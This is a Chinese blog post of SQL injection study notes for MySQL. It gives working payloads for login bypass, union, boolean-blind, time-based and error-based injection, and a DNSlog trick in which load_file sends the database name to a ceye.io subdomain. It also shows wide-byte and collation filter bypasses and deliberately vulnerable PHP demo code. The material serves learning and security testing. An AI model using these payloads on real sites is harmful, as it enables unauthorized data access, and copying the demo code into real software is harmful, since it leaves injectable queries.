<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>mysql注入简单总结 | Pale</title><meta name="keywords" content="学习笔记"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入总结进行总结，详细实现过程细节可能不会写出来~ 所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同 0x00 SQL注入原理： SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。 可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等 注入的参数">
<meta property="og:type" content="article">
<meta property="og:title" content="mysql注入简单总结">
<meta property="og:url" content="http://example.com/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/index.html">
<meta property="og:site_name" content="Pale">
<meta property="og:description" content="SQL注入总结进行总结，详细实现过程细节可能不会写出来~ 所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同 0x00 SQL注入原理： SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。 可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等 注入的参数">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="http://example.com/imgg/10.jpeg">
<meta property="article:published_time" content="2022-01-01T08:29:27.000Z">
<meta property="article:modified_time" content="2022-01-06T02:41:32.234Z">
<meta property="article:author" content="One">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/imgg/10.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'mysql注入简单总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2022-01-06 10:41:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/imgg/10.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">mysql注入简单总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-01-01T08:29:27.000Z" title="Created 2022-01-01 16:29:27">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-01-06T02:41:32.234Z" title="Updated 2022-01-06 10:41:32">2022-01-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="mysql注入简单总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a><strong>SQL注入总结</strong></h1><p>进行总结，详细实现过程细节可能不会写出来~</p>
<p>所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同</p>
<p><strong>0x00 SQL注入原理：</strong></p>
<p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。</p>
<p>可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等</p>
<p>注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。</p>
<p>注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog</p>
<p><strong>0x01 SQL注意一般方法：</strong></p>
<p>正常查询语句如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot; select username,age from userinfo where id=&#x27;$_GET[&#x27;id&#x27;]&#x27; &quot;);</span><br></pre></td></tr></table></figure>

<p><strong>万能密码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">&#x27; or 1=1#　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or 1=1#&#x27;</span><br><span class="line">&#x27;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27;=0#</span><br></pre></td></tr></table></figure>

<p><strong>使用union进行联合查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,(select database()) #</span><br><span class="line">xx&#x27; union select (select database()),2 or &#x27;　　　　　　//这里如果把查询语句放到2的位置上，因为or的关系会不能显示正常查询的内容 </span><br></pre></td></tr></table></figure>

<p>这个结果是在输出列为我们可控的 database()和’2’这2个值，那么如果登录页面的验证逻辑是如下形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query(&quot; select username,password from userinfo where id=&#x27;$_GET[&#x27;username&#x27;]&#x27; &quot;);</span><br><span class="line">if(md5($_GET[&#x27;password&#x27;]) === $result[&#x27;password&#x27;])&#123;</span><br><span class="line">　　echo &quot;登录成功&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　echo &quot;登录失败&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 我们便可以通过下来方法构造来绕过用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账户：xx&#x27; union select 1,&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27; #　　　　　　//c81e728d9d4c2f636f067f89cc14862c是2的md5值</span><br><span class="line">密码：2</span><br></pre></td></tr></table></figure>

<p><strong>使用bool回显判断注入</strong></p>
<p>substr(str,start,long)</p>
<p>　　str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度</p>
<p>if(exp1,exp2,exp3)</p>
<p>　　如果满足exp1,那么执行exp2,否则执行exp3</p>
<p>注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),1,1)=&#x27;c&#x27;),1,0) #　　　　//判断数据库第一个字符是否为c</span><br></pre></td></tr></table></figure>

<p>那么查询第二个字符可以用下列方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),1,2)=&#x27;ct&#x27;),1,0) #　　　　</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),2,1)=&#x27;t&#x27;),1,0) #　　　　</span><br></pre></td></tr></table></figure>

<p>假设 , (逗号)被过滤了，可以用如下方式处理</p>
<p>　if(exp1, exp2, exp3) =&gt; case when exp1 then exp2 else exp3 end</p>
<p>　substr(exp1, 1, 1) =&gt; substr(exp1) from 1 for 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or case when (substr((select database()) from 1 for 1)=&#x27;c&#x27;) then 1 else 0 end #</span><br></pre></td></tr></table></figure>

<p>假设substr被过滤了，可以用如下方式处理</p>
<p>LOCATE(substr,str,pos)</p>
<p>　　返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0</p>
<p>　　ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个binary即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((locate(binary&#x27;c&#x27;,(select database()),1)=1),1,0) #</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((locate(binary&#x27;t&#x27;,(select database()),1)=2),1,0) #</span><br></pre></td></tr></table></figure>

<p><strong>使用延迟注入</strong></p>
<p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功</p>
<p>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显</p>
<p>还是利用if来判断结果正确与否，只是返回值用延时来代替1</p>
<p>方法：sleep，benchmark， 笛卡尔积等（其他的我还是太菜不太会用）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于sleep的延迟 xx&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span><br><span class="line">基于笛卡尔乘积运算时间造成的时间延迟</span><br><span class="line">xx&#x27; or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # 基于benchmark的延迟 xx&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;a&#x27;))),1) #--大概会用2S时间</span><br></pre></td></tr></table></figure>

<p>benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟</p>
<p><strong>使用DNSlog进行数据回显</strong></p>
<p>原理网上很多文章都有，这里稍微总结下使用技巧</p>
<p>load_file()</p>
<p>　　读取文件并返回文件内容为字符串。</p>
<p>这里先在ceye.io上注册个账号看看自己的子域名就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;or if(length((select database()))&gt;1,(select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.你账号的子域名.ceye.io\\a&#x27;))),1) # </span><br></pre></td></tr></table></figure>

<p>只要能够写select的地方，并且能够调用load_file函数就能执行</p>
<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109122423553-1822791446.png"><img src="1419450-20190109122423553-1822791446.png" alt="img"></a></p>
<p><strong>报错注入</strong></p>
<p>报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容</p>
<p>报错注入函数很多，这里就介绍两种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; and (updatexml(1,concat(1,(select database()),1),1))　　　　# 用 or连接也行</span><br><span class="line">xx&#x27; and (extractvalue(1,concat(1,(select database()),1)))　　　# 用 or连接也行</span><br></pre></td></tr></table></figure>

<p><strong>0x02 SQL注入的技巧:</strong></p>
<p>该小结的例句还是以0x01节的原始查询语句相同</p>
<p><strong>mid切割字符串</strong></p>
<p>常常会出现回显字符串长度的限制，我们可以用mid来切割</p>
<p>mid(str, start[, length])</p>
<p>　　str为待切割的字符串，start为从第几个位置开始,length(没有则返回后面所有)为切割长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#x27; union select (mid((select database()),1,2))</span><br></pre></td></tr></table></figure>

<p>在写到这时，发现mid和substr作用很像，自己测试也一下可以在有时”代替”substr进行bool型判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if(mid((select database()),2,1)=&#x27;t&#x27;,1,0) #</span><br></pre></td></tr></table></figure>

<p><strong>hex编码与字符串</strong></p>
<p>字符串在某种意义上是和它的hex值等价的，举个栗子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = &#x27;1&#x27;    &lt;===&gt;  select * from admin where id = 0x31</span><br></pre></td></tr></table></figure>

<p>在”好不容易”逃逸第一个 ‘(单引号)后，后面的有会有查询关键字需要单引号会破坏sql语句结构时候用</p>
<p>或者一些关键字被过滤了，但是又会出现在查询里面</p>
<p>能够被hex编码的内容必须是字符串，即’(被单引号括起来)’的内容。关键字是不能被编码的</p>
<p><strong>利用group_concat连接多行</strong></p>
<p> 有些时候返回值只能显示一行内容，这时候有2种办法</p>
<p>用limit一行一行的运行</p>
<p>用group_concat将内容连在一行一并输出</p>
<p>可见group_concat比limit要方便一点，使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,(select group_concat(name，id) from admin) #</span><br></pre></td></tr></table></figure>

<p>它输出格式是每个元组用逗号隔开的(我这里email是我在做其他测试时候瞎填的)</p>
<p><a href=""><img src="1419450-20190109133111315-1086071877.png" alt="img"></a></p>
<p><strong>利用like和regexp来进行匹配</strong></p>
<p> like后面能进行模糊匹配，关键字内容为</p>
<p>%　　　　=&gt; 匹配任意个字符串</p>
<p>_　　　　 =&gt; 匹配一个字符</p>
<p>但是存在前提，被匹配的字符可以是select查询语句，可以是该表内的字段，可以是返回为字符串的函数比如database()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or database() like &#x27;c%&#x27; #</span><br><span class="line">xx&#x27; or database() like &#x27;ct_&#x27; #xx&#x27; or name like &#x27;siji%&#x27; #xx&#x27; or (select dd from uesrinfo) like &#x27;h%&#x27; #</span><br></pre></td></tr></table></figure>

<p>在某种程度上regexp和like的效果差不多，但是它是支持正则表达式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or database() like &#x27;^c.f$&#x27; #</span><br></pre></td></tr></table></figure>

<p> 但是这样不方便，测试一下后发现可以用这个方法逐个匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or name regexp &#x27;^s$*&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or name regexp &#x27;^si$*&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>mysql的GBK导致的宽字节注入</strong></p>
<p>因为gbk是2个字节为一个编码，而我们如果把字符用url编码后%xx是一个字节，%xx%xx才表示一个gbk编码。在post或者get传参的时候会自动进行一次url解码</p>
<p>常见的过滤为addslashes(str)会把 ‘ 转义为 &#39; 导致注入失败</p>
<p>那么在宽字节注入的时候</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,database() # 　　　　//是会被拦截的</span><br><span class="line">xx%df&#x27; union select 1,2,datbase() #　　　 //款字节注入，会把\&#x27;组合在一起</span><br></pre></td></tr></table></figure>

<p><a href=""><img src="1419450-20190109144139622-1954433630.png" alt="img"></a></p>
<p>这个是还没进数据库前的样子，因为web页面解析用的gbk所以达到了这个效果。而实际进入数据库是这样的，看看日志(该文件编码是utf-8)</p>
<p><a href=""><img src="1419450-20190109144949627-1705224551.png" alt="img"></a></p>
<p>将文件用gbk编码形式打开</p>
<p><a href=""><img src="1419450-20190109145501432-326465736.png" alt="img"></a></p>
<p>无论设置没有设置gbk传进去的字符样子没啥变化，但是内部处理机制发生了变化。总而言之gbk把 β\ 当成一个字符，而不是gbk模式下 β \ 是被当成2个字符</p>
<p><strong>mysql关于utf-8编码问题</strong></p>
<p>如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的</p>
<p>是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式</p>
<p>utf8_unicode_ci</p>
<p>该模式会把特殊字母转换成2个正规英文，例如ß=ss</p>
<p>utf8_general_ci</p>
<p>该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U</p>
<p>比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql1 = select * from admin where id = &#x27;xx&#x27; union select 1,2,database() #</span><br><span class="line">$sql2 = select * from admin where id = &#x27;xx&#x27; uniÖn select 1,2,database() #</span><br><span class="line">if(preg_match(&#x27;/union/i&#x27;,$sql1) &gt; 0)&#123;</span><br><span class="line">　　echo &#x27;waf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　执行sql语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/union/i&#x27;,$sql2) &gt; 0)&#123;</span><br><span class="line">　　echo &#x27;waf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　执行sql语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>二次注入:</strong></p>
<p>二次注入的原理是在把非法代码添加进数据库里面存储了，因为 &#39; 这种转义不会把(反斜杠)代入到数据库中存储，然后在其他地方调用了这个非法代码并且拼接到sql语句中了</p>
<p>简而言之</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">非法代码             ==存入==&gt;  数据库　　　　　　　　#非法代码  \&#x27; 这种转义的只会把 &#x27; 存入数据库</span><br><span class="line"></span><br><span class="line">数据库中的非法代码字段 ==取出==&gt; 后台语言中的变量中</span><br><span class="line"></span><br><span class="line">后台语言变量的非法代码 ==代入==&gt; sql查询语句中进行拼接</span><br></pre></td></tr></table></figure>

<p>这里我手写了个建议的二次注入原理代码</p>
<p>插入数据页面代码input.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br><span class="line">    mysql_select_db(&quot;test&quot;, $conn);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        用户id:&lt;input type = &quot;text&quot; name=&quot;id&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        用户名：&lt;input type = &quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        密码：&lt;input type = &quot;text&quot; name=&quot;password&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        邮箱：&lt;input type =&quot;text&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $id = @addslashes($_POST[&#x27;id&#x27;]);</span><br><span class="line">    $username = @addslashes($_POST[&#x27;username&#x27;]);</span><br><span class="line">    $password = @addslashes($_POST[&#x27;password&#x27;]);</span><br><span class="line">    $email = @addslashes($_POST[&#x27;email&#x27;]);</span><br><span class="line">    $sql = &quot;insert into userinfo values(&#x27;$id&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;,&#x27;$email&#x27;)&quot;;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查询数据页面代码out.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $uid = $_GET[&#x27;uid&#x27;];</span><br><span class="line">    $conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br><span class="line">    mysql_select_db(&quot;test&quot;, $conn);</span><br><span class="line">    $sql = &quot;SELECT * FROM userinfo where id=&#x27;$uid&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $ans = mysql_fetch_array($result);</span><br><span class="line">    $username = $ans[&#x27;username&#x27;];</span><br><span class="line">    $sql2 = &quot;SELECT * FROM userinfo where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql2);</span><br><span class="line">    $ans = mysql_fetch_array($result);</span><br><span class="line">    var_dump($ans);</span><br></pre></td></tr></table></figure>

<p>首先查看数据库里面的数据，就2个</p>
<p><a href=""><img src="1419450-20190109153334333-1741182970.png" alt="img"></a></p>
<p>在input.php页面添加信息，用户名就是我们的注入代码</p>
<p><a href=""><img src="1419450-20190109153439917-1960234704.png" alt="img"></a></p>
<p>再看数据库，发现 \ 这个符号确实没有被代入数据库中存储</p>
<p><a href=""><img src="1419450-20190109153743651-359479936.png" alt="img"></a></p>
<p>在out.php中传入get参数3，发现执行union联合查询输出的1,2,database(),4。这里我数据库名字叫做’test’</p>
